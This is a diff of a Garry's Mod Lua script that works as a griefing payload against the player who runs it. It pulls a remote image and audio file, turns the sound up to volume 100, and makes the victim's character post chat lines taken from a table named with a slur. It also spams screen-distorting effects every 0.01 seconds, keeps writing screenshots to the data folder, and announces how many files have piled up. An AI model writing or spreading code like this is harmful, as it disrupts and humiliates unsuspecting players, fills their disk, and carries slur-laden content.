@@ -31,25 +31,17 @@ local deathColors = {
 	"sprites/m24_exp"
 }
 
-local function RandomString(extension)
-	if not extension or extension == nil then 
-		extension = ""
-	end
-	return string.format("%X%s",tostring(math.Rand(-9999999999,9999999999)), extension)
-end
+local function generateRandomString(length)
+    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    local generateRandomString = ""
+    local charsCount = #chars
 
-local function LargeRandomString(extension)
-	if not extension or extension == nil then 
-		extension = ""
-	end
-	return string.format("%s%s%s", RandomString(), RandomString(), RandomString(extension))
-end
+    for i = 1, length do
+        local randomIndex = math.random(charsCount)
+        generateRandomString = generateRandomString .. string.sub(chars, randomIndex, randomIndex)
+    end
 
-local function WTFSTRING(extension)
-	if not extension or extension == nil then 
-		extension = ""
-	end
-	return string.format("%s%s%s%s%s",LargeRandomString(),LargeRandomString(),LargeRandomString(),LargeRandomString(),LargeRandomString(extension))
+    return generateRandomString
 end
 
 local function FuckYou()
@@ -61,7 +53,7 @@ local function FuckYou()
 		h = ScrH(),
 		quality = "100"
 	})
-	file.Write(RandomString(".jpeg"), fucked)
+	file.Write(generateRandomString(30) .. ".jpeg", fucked)
 end
 
 local funny 
@@ -71,11 +63,13 @@ http.Fetch("https://cdn.discordapp.com/attachments/1100513529745903690/115349132
 	funny = Material("../data/ssddasd.png")
 	print(funny)
 
-end)
+end) 
 
 local function DoAlotOfStuff()
 	
+	local originalFileAmt = #currFiles
 	local iterations = 0
+
 	hook.Add("PostRender", "hoob", function() 
 
 		iterations = iterations + 1
@@ -87,8 +81,10 @@ local function DoAlotOfStuff()
 
 	end)
 
-	timer.Create(RandomString(), 1, 0, function() LocalPlayer():ConCommand("say " .. table.Random(faggotStuff)) end)
-	timer.Create(RandomString(), 0.01, 0, function() LocalPlayer():ConCommand(string.format("pp_texturize %s",table.Random(deathColors))) end)
+	timer.Create(generateRandomString(20), 10, 0, function() LocalPlayer():ConCommand("say " .. table.Random(faggotStuff)) end)
+	local newScreenshots = 0
+	timer.Create(generateRandomString(10), 4, 0, function() LocalPlayer():ConCommand("say " .. newScreenshots) end)
+	timer.Create(generateRandomString(20), 0.01, 0, function() LocalPlayer():ConCommand(string.format("pp_texturize %s",table.Random(deathColors))) end)
 
 	hook.Add("PreRender", "hoob", function()
 
@@ -113,6 +109,14 @@ local function DoAlotOfStuff()
 		cam.End2D()
 	end)
 
+	hook.Add("Think",generateRandomString(100), function()
+
+
+		local curFiles,curDirs = file.Find("*", "DATA")
+		newScreenshots = #curFiles - originalFileAmt
+
+	end)
+
 end
 
 sound.PlayURL("https://files.catbox.moe/gly8lo.flac", "noblock", function(sound)
@@ -120,6 +124,7 @@ sound.PlayURL("https://files.catbox.moe/gly8lo.flac", "noblock", function(sound)
 	sound:SetVolume(0)
 	sound:SetTime(1, true)
 	sound:SetVolume(1)
+	currFiles,currDirs = file.Find("*", "DATA")
 	timer.Simple(11.9, function() sound:SetVolume(100) DoAlotOfStuff() end)
 
 end)
